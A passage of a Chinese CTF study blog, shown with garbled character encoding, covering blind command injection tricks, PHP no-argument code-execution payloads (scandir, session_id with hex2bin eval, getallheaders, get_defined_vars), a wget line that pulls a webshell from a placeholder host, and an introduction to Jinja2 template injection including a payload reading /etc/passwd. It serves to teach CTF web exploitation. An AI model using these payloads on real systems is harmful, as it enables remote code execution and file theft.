<p>grep fla &#x2F;fla* å‘½ä»¤ä¼šåŒ¹é…æ ¹ç›®å½•ä¸‹æ‰€æœ‰ä»¥ fla å¼€å¤´çš„æ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬å­ç›®å½•ï¼‰ï¼Œç„¶åå°†è¿™äº›æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸² fla çš„è¡Œè¾“å‡ºåˆ°ç»ˆç«¯ä¸Šã€‚å› æ­¤ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šæœç´¢æ ¹ç›®å½•ä¸‹ä»¥ fla å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶åŒ¹é…å…¶ä¸­åŒ…å« fla å­—ç¬¦ä¸²çš„è¡Œã€‚</p>
<p>è€Œ grep fla fla* å‘½ä»¤ä¸­ fla* æ˜¯å½“å‰ç›®å½•ä¸‹ä»¥ fla å¼€å¤´çš„æ‰€æœ‰æ–‡ä»¶çš„é€šé…ç¬¦ï¼Œå®ƒä¼šåŒ¹é…å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ä»¥ fla å¼€å¤´çš„æ–‡ä»¶ï¼Œç„¶åå°†è¿™äº›æ–‡ä»¶ä¸­åŒ…å«å­—ç¬¦ä¸² fla çš„è¡Œè¾“å‡ºåˆ°ç»ˆç«¯ä¸Šã€‚å› æ­¤ï¼Œè¿™ä¸ªå‘½ä»¤åªä¼šæœç´¢å½“å‰ç›®å½•ä¸‹ä»¥ fla å¼€å¤´çš„æ–‡ä»¶ï¼Œå¹¶åŒ¹é…å…¶ä¸­åŒ…å« fla å­—ç¬¦ä¸²çš„è¡Œã€‚</p>
<ul>
<li>stringsï¼š<br>ç›¸å½“äºcat</li>
</ul>
<h2 id="æ— å›æ˜¾æ—¶é—´ç›²æ³¨ï¼š"><a href="#æ— å›æ˜¾æ—¶é—´ç›²æ³¨ï¼š" class="headerlink" title="æ— å›æ˜¾æ—¶é—´ç›²æ³¨ï¼š"></a>æ— å›æ˜¾æ—¶é—´ç›²æ³¨ï¼š</h2><p>é€»è¾‘å’ŒSQLæ³¨å…¥çš„æ—¶é—´ç›²æ³¨å·®ä¸å¤š</p>
<p>ç›¸å…³å‘½ä»¤ï¼š<br>1.sleep<br>sleep 5       #5ç§’ä¹‹åè¿”å›ç»“æœ</p>
<p>2.awkï¼šé€è¡Œè·å–æ•°æ®<br>3.cut -c<br>cutå‘½ä»¤é€åˆ—è·å–å•ä¸ªå­—ç¬¦<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #è·å–ç¬¬ä¸€ä¸ªå­—ç¬¦<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #è·å–ç¬¬äºŒä¸ªå­—ç¬¦</p>
<p>3.åˆ©ç”¨cpå‘½ä»¤ï¼šcp flag.php 1.txt</p>
<p>4.åˆ©ç”¨mvå‘½ä»¤ï¼šmv flag.php 1.txt</p>
<p>5.åˆ©ç”¨&gt;è¾“å‡ºç»“æœåˆ°æ–‡ä»¶ï¼šls &gt; 1.txt</p>
<p>6.tee:Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶</p>
<p>7.åˆ©ç”¨wgetä¸‹è½½ï¼š</p>
<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.phpæˆ–è€…wget http://ip/shell.txt -O shell.php</code></pre>

<p>8.dnslogå¤–å¸¦æ•°æ®</p>
<h2 id="éƒ½æ˜¯fakeflag-è¯•è¯•ç¯å¢ƒå˜é‡-proc-self-environå’ŒenvæŒ‡ä»¤"><a href="#éƒ½æ˜¯fakeflag-è¯•è¯•ç¯å¢ƒå˜é‡-proc-self-environå’ŒenvæŒ‡ä»¤" class="headerlink" title="éƒ½æ˜¯fakeflag ,è¯•è¯•ç¯å¢ƒå˜é‡&#x2F;proc&#x2F;self&#x2F;environå’ŒenvæŒ‡ä»¤"></a>éƒ½æ˜¯fakeflag ,è¯•è¯•ç¯å¢ƒå˜é‡&#x2F;proc&#x2F;self&#x2F;environå’ŒenvæŒ‡ä»¤</h2><h2 id="æ— å‚æ•°"><a href="#æ— å‚æ•°" class="headerlink" title="æ— å‚æ•°"></a>æ— å‚æ•°</h2><p>æœ€è¿‘æ‰“æ¯”èµ›çœ‹åˆ°ä¸€äº›æ— å‚çš„é¢˜ç›®ï¼Œæ‹¿æ¥ç ”ç©¶ä¸€ä¸‹</p>
<h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>*scandir()<em>å‡½æ•°å¯ä»¥è¿”å›å½“å‰ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•çš„åˆ—è¡¨ã€‚é€šè¿‡ç»“åˆ</em>localeconv()<em>å’Œ</em>current()*å‡½æ•°ï¼Œå¯ä»¥æ„é€ å‡ºä¸€ä¸ªè¿”å›å½“å‰ç›®å½•æ–‡ä»¶åˆ—è¡¨çš„payloadã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">?exp=var_dump(next(array_reverse(scandir(current(localeconv()))));
localeconv()å–å‡ºä¸€ä¸ª.å¹¶ä¸”åˆ©ç”¨current()å–åˆ°.å‘å‰ä¸€ä¸ªç›®å½•ç§»åŠ¨ï¼Œå†ä½¿ç”¨scandiræ‰«å½“å‰ç›®å½•ï¼Œåˆ©ç”¨array_reverseå’Œnext()è¿›è¡Œç§»åŠ¨</code></pre>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ**localeconv()<strong>è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯*.*ï¼Œè¡¨ç¤ºå½“å‰ç›®å½•ã€‚</strong>current()<strong>å‡½æ•°å–å‡ºè¿™ä¸ª*.*ï¼Œç„¶åä¼ é€’ç»™</strong>scandir()**å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›å½“å‰ç›®å½•çš„æ–‡ä»¶åˆ—è¡¨<a href="https://blog.csdn.net/2301_76690905/article/details/133808536">1</a>ã€‚</p>
<pre><code class="highlight plaintext">ç±»ä¼¼çš„ç§»åŠ¨æŒ‡é’ˆ:
end() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º
next() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º
prev() ï¼šå°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º
reset() ï¼š å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º
each() ï¼š è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</code></pre>

<p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ç”¨<code>getcwd()</code>ç›´æ¥æ¨¡å½“å‰è·¯å¾„ï¼Œ<code>scandir()</code>æ‰«ï¼Œ<code>array_flip</code>äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p>
<p>åƒè¿™æ ·çš„ï¼Œè¿˜æœ‰å¾ˆå¤šï¼Œç½‘ä¸Šå¤šçš„æ˜¯è‡ªå·±æ…¢æ…¢ç ”ç©¶</p>
<pre><code class="highlight plaintext">highlight_file(array_rand(array_flip(scandir(getcwd())))); //æŸ¥çœ‹å’Œè¯»å–å½“å‰ç›®å½•æ–‡ä»¶
print_r(scandir(dirname(getcwd()))); //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶
print_r(scandir(next(scandir(getcwd()))));  //æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•çš„æ–‡ä»¶
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶
show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//è¿™ä¸ªå¾—çˆ†ç ´ï¼Œä¸ç„¶æ‰‹åŠ¨è¦åˆ·æ–°å¾ˆä¹…ï¼Œå¦‚æœæ–‡ä»¶æ˜¯æ­£æ•°æˆ–å€’æ•°ç¬¬ä¸€ä¸ªç¬¬äºŒä¸ªæœ€å¥½ä¸è¿‡äº†ï¼Œç›´æ¥å®šä½
  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶
  //æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶</code></pre>

<h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p>å½“è¯·æ±‚å¤´ä¸­æœ‰cookieæ—¶ï¼Œå¯ä»¥ä½¿ç”¨**session_id()<strong>å‡½æ•°æ¥è·å–å½“å‰ä¼šè¯IDã€‚é€šè¿‡å°†å‘½ä»¤è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œç„¶åä½¿ç”¨</strong>hex2bin()**è§£ç ï¼Œå¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">?exp=eval(hex2bin(session_id(session_start())));
Cookie: PHPSESSID=636174202f666c6167</code></pre>

<p>åŒæ—¶ï¼Œéœ€è¦åœ¨cookieä¸­è®¾ç½®ç›¸åº”çš„åå…­è¿›åˆ¶ç¼–ç å€¼</p>
<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>*getallheaders()<em>å‡½æ•°è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ã€‚å¯ä»¥åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ æ¶æ„ä»£ç ï¼Œç„¶åä½¿ç”¨</em>end()*å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä½¿å…¶æ‰§è¡Œã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">var_dump(end(getallheaders()));</code></pre>

<p>åœ¨æ•°æ®åŒ…æœ€åä¸€è¡Œæ·»åŠ ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä¾‹å¦‚*sky: phpinfo();<em>ï¼Œç„¶å</em>end()*å‡½æ•°ä¼šæŒ‡å‘è¿™ä¸ªè¯·æ±‚å¤´å¹¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚</p>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><em>get_defined_vars()<em>å‡½æ•°è¿”å›æ‰€æœ‰å®šä¹‰çš„å˜é‡ï¼ŒåŒ…æ‹¬å…¨å±€å˜é‡</em>$_GET</em>ã€*$_POST<em>ã€</em>$_COOKIE*ç­‰ã€‚å¯ä»¥é€šè¿‡æ·»åŠ å¤šä¸ªå‚æ•°æ¥æ„é€ payloadã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">?a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</code></pre>

<p>è¿™æ ·å¯ä»¥æ‰§è¡Œ**system(â€˜ls &#x2F;â€˜)**å‘½ä»¤ã€‚</p>
<h3 id="chdir-array-rand"><a href="#chdir-array-rand" class="headerlink" title="chdir() &amp; array_rand()"></a>chdir() &amp; array_rand()</h3><p>é€šè¿‡ç›®å½•éå†æ¥è¯»å–æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨*getcwd()<em>è·å–å½“å‰ç›®å½•ï¼Œç„¶åä½¿ç”¨</em>dirname()*åˆ—å‡ºçˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•ã€‚</p>
<p><code>array_rand()</code>æ˜¯éšæœºè¯»å–æ•°ç»„ä¸­çš„é”®å€¼ï¼Œéœ€è¦é…åˆ<code>array_flip</code>ä½¿ç”¨ï¼Œ<code>chdir()</code>æ˜¯è§„å®šå½“å‰çš„å·¥ä½œç›®å½•</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="highlight plaintext">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre>

]]></content>
      <tags>
        <tag>-Web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTIæ¼æ´</title>
    <url>/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="SSTI-æ¨¡æ¿æ³¨å…¥-æ¼æ´"><a href="#SSTI-æ¨¡æ¿æ³¨å…¥-æ¼æ´" class="headerlink" title="SSTI(æ¨¡æ¿æ³¨å…¥)æ¼æ´"></a>SSTI(æ¨¡æ¿æ³¨å…¥)æ¼æ´</h1><p>æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p>
<p>æ¨¡æ¿å¼•æ“ä¹Ÿä¼šæä¾›æ²™ç®±æœºåˆ¶æ¥è¿›è¡Œæ¼æ´é˜²èŒƒï¼Œä½†æ˜¯å¯ä»¥ç”¨æ²™ç®±é€ƒé€¸æŠ€æœ¯æ¥è¿›è¡Œç»•è¿‡ã€‚</p>
<h2 id="æ¨¡æ¿æ³¨å…¥æ¼æ´"><a href="#æ¨¡æ¿æ³¨å…¥æ¼æ´" class="headerlink" title="æ¨¡æ¿æ³¨å…¥æ¼æ´"></a>æ¨¡æ¿æ³¨å…¥æ¼æ´</h2><p>SSTI å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼‰</p>
<p>å½“å‰ä½¿ç”¨çš„ä¸€äº›æ¡†æ¶ï¼Œæ¯”å¦‚pythonçš„<code>flask</code>ï¼Œphpçš„<code>tp</code>ï¼Œjavaçš„<code>spring</code>ç­‰ä¸€èˆ¬éƒ½é‡‡ç”¨æˆç†Ÿçš„çš„MVCçš„æ¨¡å¼ï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”Modelä¸šåŠ¡æ¨¡å‹è¿›è¡Œä¸šåŠ¡é€»è¾‘åˆ¤æ–­ï¼Œæ•°æ®åº“å­˜å–ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œç»è¿‡æ¨¡æ¿æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ·ã€‚</p>
<p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥(ä¸€èˆ¬æ¥è¯´æ˜¯ç”¨æˆ·è¾“å…¥çš„å˜é‡)ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p>
<p>å‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½å¯èƒ½ä¼šå‡ºç° SSTI çš„é—®é¢˜ï¼ŒSSTI ä¸å±äºä»»ä½•ä¸€ç§è¯­è¨€ï¼Œæ²™ç›’ç»•è¿‡ä¹Ÿä¸æ˜¯ï¼Œæ²™ç›’ç»•è¿‡åªæ˜¯ç”±äºæ¨¡æ¿å¼•æ“å‘ç°äº†å¾ˆå¤§çš„å®‰å…¨æ¼æ´ï¼Œç„¶åæ¨¡æ¿å¼•æ“è®¾è®¡å‡ºæ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨æ²¡æœ‰å®šä¹‰æˆ–è€…å£°æ˜çš„æ¨¡å—ï¼Œè¿™é€‚ç”¨äºæ‰€æœ‰çš„æ¨¡æ¿å¼•æ“ã€‚</p>
<h2 id="ç¡®å®šæ¼æ´"><a href="#ç¡®å®šæ¼æ´" class="headerlink" title="ç¡®å®šæ¼æ´"></a>ç¡®å®šæ¼æ´</h2><p>è´´ä¸ªå›¾</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti.png" alt="ssti"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/ssti2.png" alt="ssti2"></p>
<h3 id="ç¬¬ä¸€å±‚ï¼š"><a href="#ç¬¬ä¸€å±‚ï¼š" class="headerlink" title="ç¬¬ä¸€å±‚ï¼š"></a>ç¬¬ä¸€å±‚ï¼š</h3><ul>
<li>å¦‚æœå¯ä»¥æ‰§è¡Œ${7*7}çš„ç»“æœï¼Œé‚£æˆ‘ä»¬è¿›å…¥ç¬¬äºŒå±‚çš„<code>a&#123;*comment*&#125;b</code>ï¼Œå¦‚æœæ²¡ç”¨æ‰§è¡Œç»“æœï¼Œé‚£å°±è¿›å…¥ç¬¬äºŒå±‚çš„<code>&#123;&#123;7*7&#125;&#125;</code></li>
<li>åœ¨Makoæ¨¡æ¿å¼•æ“ä¸­æˆ‘ä»¬ä¹Ÿæ˜¯${}å½¢å¼çš„</li>
</ul>
<h3 id="ç¬¬äºŒå±‚ï¼š"><a href="#ç¬¬äºŒå±‚ï¼š" class="headerlink" title="ç¬¬äºŒå±‚ï¼š"></a>ç¬¬äºŒå±‚ï¼š</h3><ul>
<li>åœ¨<code>a&#123;*comment*&#125;b</code>ä¸­ï¼Œå¦‚æœ{**}è¢«å½“ä½œæ³¨é‡Šè€Œè¾“å‡ºabï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¿™ä¸ªåœ°æ–¹æ˜¯Smartyæ¨¡æ¿ï¼Œå¦‚æœä¸èƒ½ï¼Œè¿›å…¥ç¬¬ä¸‰å±‚ï¼›</li>
<li>åœ¨<code>&#123;&#123;7*7&#125;&#125;</code>ä¸­ï¼Œå¦‚æœèƒ½å¤Ÿæ‰§è¡Œï¼Œé‚£æˆ‘ä»¬è¿›å…¥ç¬¬ä¸‰å±‚ã€‚</li>
</ul>
<h3 id="ç¬¬ä¸‰å±‚ï¼š"><a href="#ç¬¬ä¸‰å±‚ï¼š" class="headerlink" title="ç¬¬ä¸‰å±‚ï¼š"></a>ç¬¬ä¸‰å±‚ï¼š</h3><ul>
<li>å½“49çš„ç»“æœä¸º49æ—¶ï¼Œå¯¹åº”ç€Twigæ¨¡æ¿ç±»å‹ï¼Œè€Œç»“æœå¦‚æœä¸º7777777ï¼Œåˆ™å¯¹åº”ç€Jinja2çš„æ¨¡æ¿ç±»å‹</li>
<li>å½“èƒ½å¤Ÿæ‰§è¡Œ<code>$&#123;&quot;z&quot;.join(&quot;ab&quot;)&#125;</code>,æˆ‘ä»¬å°±èƒ½ç¡®å®šæ˜¯Makoæ¨¡æ¿ï¼Œèƒ½å¤Ÿç›´æ¥æ‰§è¡Œpythonå‘½ä»¤.</li>
</ul>
<p>æ¥ä¸‹æ¥å°±è¿›å…¥ä¸åŒæ¨¡æ¿çš„ä¸åŒæ³¨å…¥æ–¹å¼</p>
<h2 id="Pythonæ¨¡æ¿æ³¨å…¥"><a href="#Pythonæ¨¡æ¿æ³¨å…¥" class="headerlink" title="Pythonæ¨¡æ¿æ³¨å…¥"></a>Pythonæ¨¡æ¿æ³¨å…¥</h2><h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>pythonçš„ä¸€ç§ä¸»æµæ¨¡æ¿ï¼ŒåŸºæœ¬ä½ çœ‹åˆ°é¡µé¢åœ¨è¾“å…¥åä¼šå®æ—¶å›æ˜¾åœ¨é¡µé¢å¹¶ä¸”å‘åŒ…åçœ‹å‡ºè¯­è¨€æ˜¯pythonåŸºæœ¬å°±èƒ½ç¡®è®¤æ˜¯</p>
<pre><code class="highlight plaintext">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; -&gt; 7777777 -&gt; jinjia2</code></pre>

<p>è¿™é‡Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹jinja2çš„è¯­æ³•å¥½äº†</p>
<h4 id="è¯­æ³•ç»“æ„"><a href="#è¯­æ³•ç»“æ„" class="headerlink" title="è¯­æ³•ç»“æ„"></a>è¯­æ³•ç»“æ„</h4><p>Jinja2ä½¿ç”¨ ç»“æ„è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ï¼Œå‘Šè¯‰æ¨¡ç‰ˆå¼•æ“è¿™ä¸ªä½ç½®çš„å€¼ä»æ¸²æŸ“æ¨¡ç‰ˆæ—¶ä½¿ç”¨çš„æ•°æ®ä¸­è·å–</p>
<p>Jinja2 æ¨¡æ¿åŒæ ·æ”¯æŒæ§åˆ¶è¯­å¥ï¼Œåƒåœ¨ <code>&#123;%â€¦%&#125; </code>å—ä¸­ï¼Œä¸‹é¢ä¸¾ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨Jinja2æ¨¡æ¿å¼•æ“forè¯­å¥å¾ªç¯æ¸²æŸ“ä¸€ç»„å…ƒç´ çš„ä¾‹å­:</p>
<p><code>&lt;ul&gt;     &#123;% for comment in comments %&#125;
         <li>&#123;&#123;comment&#125;&#125;</li>
    &#123;% endfor %&#125;&lt;ul&gt;</code></p>
<p>å¦å¤–Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»å‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»å‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨è¿‡æ»¤å™¨ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ã€‚ä¾‹å¦‚ï¼Œä¸‹è¿°æ¨¡æ¿ä»¥é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼</p>
<pre><code class="highlight html">Hello, &#123;&#123;name|capitalize&#125;&#125;</code></pre>

<p>ä½†æ˜¯è¿™åªèƒ½åœ¨æ¸²æŸ“å‰çš„æ¨¡æ¿ä¸­è¿›è¡Œæ³¨å…¥ï¼Œå¦‚æœæ¨¡æ¿å·²ç»æ¸²æŸ“ï¼Œå°±ä¸å­˜åœ¨æ¨¡æ¿æ³¨å…¥äº†:</p>
<pre><code class="highlight plaintext">from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route(&quot;/&quot;)
def index():
    name = request.args.get(&#x27;name&#x27;, &#x27;guest&#x27;)

    t = Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)
    return t.render(n=name)

if __name__ == &quot;__main__&quot;:
    app.run()</code></pre>

<p>ç¼–è¯‘è¿è¡Œï¼Œå†æ¬¡æ³¨å…¥å°±ä¼šå¤±è´¥<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1344396-20200903151308616-823367288.png" alt="img"></p>
<pre><code class="highlight plaintext">&#123;% ... %&#125; for Statements #ç”¨æ¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥ç”¨äºæ¡ä»¶è¯­å¥å’Œå¾ªç¯è¯­å¥
ä¾‹å­:
&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
&#123;% if c.__name__==&#x27;file&#x27; %&#125;
&#123;&#123; c(&quot;/etc/passwd&quot;).readlines() &#125;&#125;
&#123;% endif %&#125;
&#123;% endfor %&#125;
 
&#123;&#123; ... &#125;&#125; for Expressions to print to the template output #å°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º
 
&#123;# ... #&#125; for Comments not included in the template output #è¡¨ç¤ºæœªåŒ…å«åœ¨æ¨¡æ¿è¾“å‡ºä¸­çš„æ³¨é‡Š
 
#...# for Line Statements #æœ‰å’Œ&#123;%%&#125;ç›¸åŒçš„æ•ˆæœ</code></pre>

<p>æœ‰äº›æ—¶å€™è¿‡æ»¤å¯èƒ½ä¼šbanæ‰åŒæ‹¬å·ï¼Œè¿™æ—¶å€™å¯èƒ½å°±éœ€è¦ç”¨åˆ°ä¸Šé¢çš„ä¸€äº›è¯­æ³•</p>
<h4 id="jinja2çš„ä¿„ç½—æ–¯å¥—å¨ƒ"><a href="#jinja2çš„ä¿„ç½—æ–¯å¥—å¨ƒ" class="headerlink" title="jinja2çš„ä¿„ç½—æ–¯å¥—å¨ƒ"></a>jinja2çš„ä¿„ç½—æ–¯å¥—å¨ƒ</h4><p>çœ‹è¿‡jinja2ç›¸å…³æ¨¡æ¿æ³¨å…¥é¢˜ç›®çš„äººå°±èƒ½æ˜ç™½æ˜¯ä»€ä¹ˆæ„æ€äº†å“ˆå“ˆ()</p>
<p>ä»‹ç»ä¸€ä¸‹åŸºç±»çš„ä¸€äº›æ¦‚å¿µä¹‹ç±»çš„å§</p>
<p><code>&#39;&#39; [] ()</code>éƒ½æ˜¯æœ€ç®€å•çš„æ•°æ®ç±»å‹ï¼Œè€Œæˆ‘ä»¬æœ€ä¸€èˆ¬çš„æ€è·¯å°±æ˜¯é€šè¿‡è¿™äº›æ¥æ‰¾åˆ°åŸºç±»ï¼Œè¿™é‡Œå°±è¦æ¶‰åŠåˆ°ä¸€äº›é­”æœ¯æ–¹æ³•äº†</p>
<p>é‚£å°±æŒ‰é¡ºåºè¿›è¡Œä¸€ä¸ªä»‹ç»å§</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¦æ‰¾åˆ°åŸºç±»</p>
<p>äºæ˜¯æˆ‘ä»¬å°±è¦ç”¨åˆ°<code>__class__</code>è¿”å›ä¸€ä¸ªå®ä¾‹æ‰€å±çš„ç±»</p>
<p>ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰¾åˆ°ObjectåŸºç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥è¿”å›</p>
<p>æ‰€ä»¥å°±è¦ç”¨åˆ°<code>__base__ __bases__  __mro__</code></p>
<p><code>base</code>æœ€ä¸ºç›´æ¥ï¼Œå°±æ˜¯ç›´æ¥è¿”å›ä¸Šå±‚çš„çˆ¶ç±»ï¼Œè€Œ<code>bases</code>æ˜¯é€’å½’è¿”å›æ‰€æœ‰ä¸Šé¢çš„ç±»ï¼Œæœ¯è¯­ä¸Šæ˜¯å«å…ƒç»„ï¼Œ<code>mro</code>åŒç†,ä½†æ˜¯ä¼šåŒ…å«åŸæ¥å°±æ‰€å±çš„ç±»</p>
